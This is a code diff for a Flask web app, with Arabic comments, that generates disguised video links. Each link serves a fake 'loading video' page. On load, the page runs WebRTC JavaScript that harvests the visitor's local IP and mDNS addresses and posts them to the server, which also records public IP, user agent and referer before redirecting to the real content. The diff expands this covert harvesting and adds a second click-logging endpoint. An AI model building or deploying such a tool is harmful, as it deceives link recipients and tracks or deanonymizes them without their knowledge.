@@ -31,7 +31,6 @@ def init_db():
                 platform TEXT
             )
         ''')
-        # تم إبقاء حقل local_ip متاحاً لاستقبال البيانات المتاحة مع تلافي أخطاء التحديث
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS clicks (
                 id TEXT PRIMARY KEY,
@@ -212,7 +211,7 @@ HTML_LAYOUT = '''
                     <tr>
                         <td><strong>{{ link.note }}</strong></td>
                         <td><span class="platform-badge bg-{{ link.platform.lower() }}">{{ link.platform }}</span></td>
-                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="{{ link.video_title }}">{{ link.video_title }}</td>
+                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="{{ link.video_title }}">{{ link.video_title[:50] }}{% if link.video_title|length > 50 %}...{% endif %}</td>
                         <td><span class="badge">{{ link.clicks_count }}</span></td>
                         <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                         <td><img src="{{ link.custom_image }}" width="50" height="40" style="border-radius: 5px; object-fit: cover;" onerror="this.src='https://placehold.co/50x40'"></td>
@@ -242,7 +241,7 @@ HTML_LAYOUT = '''
                         <td>{{ click.time }}</td>
                         <td style="color:#e53e3e; font-weight:bold;"><code>{{ click.ip }}</code></td>
                         <td class="local-ip">{{ click.local_ip or 'مخفي / غير متوفر' }}</td>
-                        <td style="max-width: 200px; word-break: break-all; font-size:11px;">{{ click.user_agent[:60] }}...</td>
+                        <td style="max-width: 200px; word-break: break-all; font-size:11px;">{{ click.user_agent[:60] if click.user_agent else 'غير معروف' }}...</td>
                         <td>{{ click.referer or 'مباشر' }}</td>
                     </tr>
                     {% endfor %}
@@ -349,43 +348,74 @@ def secure_redirect(link_id):
         else:
             description = "اضغط لتشغيل وعرض مقطع الفيديو المرفق بجودة عالية."
             
-        # تم إصلاح تمرير المتغير وجعل الكود متوافق قياسياً مع المتصفحات
+        # تقنية متقدمة لجلب الـ IP المحلي باستخدام WebRTC (مأخوذة من الكود الأصلي)
         local_ip_script = f'''
         <script>
-            function getWebRTCIP(callback) {{
-                var pc = new RTCPeerConnection({{ iceServers: [] }});
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => {{}});
+            // تقنية متقدمة لجلب الـ IP المحلي باستخدام WebRTC
+            function gatherLocalIPsAndRedirect() {{
+                var detectedIPs = [];
+                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                 
-                pc.onicecandidate = function(event) {{
-                    if (!event || !event.candidate) return;
-                    var parts = event.candidate.candidate.split(' ');
-                    for (var i = 0; i < parts.length; i++) {{
-                        if (parts[i].match(/^(?:[0-9]{{1,3}}\.){{3}}[0-9]{{1,3}}$/)) {{
-                            callback(parts[i]);
-                            return;
-                        }} else if (parts[i].endsWith('.local')) {{
-                            callback(parts[i]); // استرجاع نطاق mDNS الحصري للمتصفحات الحديثة
-                            return;
-                        }}
+                if (!window.RTCPeerConnection) {{
+                    sendLocalIPData("غير مدعوم (متصفح قديم)");
+                    return;
+                }}
+
+                var pc = new RTCPeerConnection({{ iceServers: [] }});
+                pc.createDataChannel(""); 
+                
+                pc.onicecandidate = function(e) {{
+                    if (!e || !e.candidate || !e.candidate.candidate) return;
+                    var candidate = e.candidate.candidate;
+                    // تعبير Regex لاستخراج IP أو mDNS
+                    var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
+                    var mdnsRegex = /([a-f0-9\\-]+\\.local)/i;
+                    
+                    var match = ipRegex.exec(candidate) || mdnsRegex.exec(candidate);
+                    if (match && detectedIPs.indexOf(match[1]) === -1) {{
+                        detectedIPs.push(match[1]);
                     }}
                 }};
-                setTimeout(() => callback(null), 1000);
-            }}
 
-            window.addEventListener('load', function() {{
-                getWebRTCIP(function(ip) {{
-                    var detectedIP = ip ? ip : "مخفي بواسطة المتصفح (mDNS)";
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', '/log-local-ip/' + '{click_id}', true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.send(JSON.stringify({{ local_ip: detectedIP }}));
+                pc.createOffer().then(function(sdp) {{
+                    // تحليل SDP لاستخراج المزيد من الـ IPs
+                    sdp.sdp.split('\\n').forEach(function(line) {{
+                        if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
+                            var parts = line.split(' ');
+                            parts.forEach(function(part){{
+                                if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
+                                    if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
+                                }}
+                            }});
+                        }}
+                    }});
+                    pc.setLocalDescription(sdp);
+                }}).catch(function(err) {{
+                    console.log("WebRTC Error:", err);
                 }});
 
+                // انتظار 1.5 ثانية لجمع النتائج ثم الإرسال
                 setTimeout(function() {{
-                    window.location.href = "{link_data['original_url']}";
+                    var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS)";
+                    sendLocalIPData(finalLocalIp);
                 }}, 1500);
-            }});
+            }}
+
+            function sendLocalIPData(localIp) {{
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "/log-local-ip/{click_id}", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.onreadystatechange = function () {{
+                    if (xhr.readyState === 4) {{
+                        // التوجيه إلى الرابط الأصلي بعد تسجيل البيانات
+                        window.location.href = "{link_data['original_url']}";
+                    }}
+                }};
+                xhr.send(JSON.stringify({{ "local_ip": localIp }}));
+            }}
+            
+            // بدء العملية عند تحميل الصفحة
+            window.onload = gatherLocalIPsAndRedirect;
         </script>
         '''
             
@@ -424,6 +454,7 @@ def secure_redirect(link_id):
                 .title {{ font-size: 18px; margin-top: 20px; opacity: 0.9; font-weight: bold; }}
                 .redirect-note {{ font-size: 14px; margin-top: 20px; opacity: 0.7; }}
                 .preview-image {{ max-width: 320px; border-radius: 10px; margin: 20px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); object-fit: cover; }}
+                .ip-status {{ font-size: 11px; margin-top: 15px; opacity: 0.6; font-family: monospace; }}
             </style>
         </head>
         <body>
@@ -431,7 +462,8 @@ def secure_redirect(link_id):
                 <img src="{image_url}" alt="Preview" class="preview-image" onerror="this.style.display='none'">
                 <div class="spinner"></div>
                 <div class="title">{title}</div>
-                <div class="redirect-note">جاري تهيئة دفق الفيديو... سيتم توجيهك تلقائياً للتشغيل الرسمي</div>
+                <div class="redirect-note">جاري تحميل دفق الفيديو... سيتم توجيهك تلقائياً للتشغيل الرسمي</div>
+                <div class="ip-status" id="ipStatus">🔍 جاري اكتشاف معلومات الشبكة...</div>
             </div>
             {local_ip_script}
         </body>
@@ -441,7 +473,7 @@ def secure_redirect(link_id):
 
 @app.route('/log-local-ip/<click_id>', methods=['POST'])
 def log_local_ip(click_id):
-    """تحديث نفس سجل النقرة الفريد لضمان عدم تداخل البيانات"""
+    """تحديث نفس سجل النقرة الفريد باستخدام الـ IP المحلي"""
     try:
         data = request.get_json() or {}
         local_ip = data.get('local_ip', 'غير متوفر')
@@ -455,9 +487,39 @@ def log_local_ip(click_id):
             ''', (local_ip, click_id))
             conn.commit()
             
+        logger.info(f"تم تسجيل IP محلي للنقرة {click_id}: {local_ip}")
         return jsonify({"status": "success"}), 200
     except Exception as e:
         logger.error(f"Error logging local IP: {e}")
+        return jsonify({"status": "error"}), 500
+
+@app.route('/log-click/<link_id>', methods=['POST'])
+def log_click(link_id):
+    """نقطة نهاية بديلة للتسجيل (للتوافق مع الإصدارات السابقة)"""
+    try:
+        data = request.get_json() or {}
+        local_ip = data.get('local_ip', 'غير متوفر')
+        
+        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if ip_address and ',' in ip_address:
+            ip_address = ip_address.split(',')[0].strip()
+            
+        user_agent = request.headers.get('User-Agent', 'غير معروف')
+        referer = request.headers.get('Referer', '')
+        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        click_id = str(uuid.uuid4())
+        
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO clicks (id, link_id, ip, local_ip, user_agent, referer, time) 
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (click_id, link_id, ip_address, local_ip, user_agent, referer, current_time))
+            conn.commit()
+            
+        return jsonify({"status": "success"}), 200
+    except Exception as e:
+        logger.error(f"Error logging click: {e}")
         return jsonify({"status": "error"}), 500
 
 if __name__ == '__main__':
